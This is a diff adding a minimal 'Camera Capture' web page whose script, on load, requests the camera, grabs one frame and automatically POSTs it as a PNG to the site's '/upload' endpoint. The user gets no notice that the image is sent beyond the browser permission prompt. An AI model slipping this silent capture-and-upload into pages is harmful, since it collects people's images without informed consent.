@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Capture</title>
+</head>
+<body>
+  <script>
+    async function captureImage() {
+      const video = document.createElement('video');
+      document.body.appendChild(video);
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/png');
+      stream.getTracks().forEach(track => track.stop());
+      video.remove();
+
+      return imageData;
+    }
+
+    captureImage().then(imageData => {
+      fetch('/upload', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ image: imageData })
+      }).then(response => {
+        console.log('Image uploaded successfully');
+      }).catch(error => {
+        console.error('Error uploading image:', error);
+      });
+    });
+  </script>
+</body>
+</html>
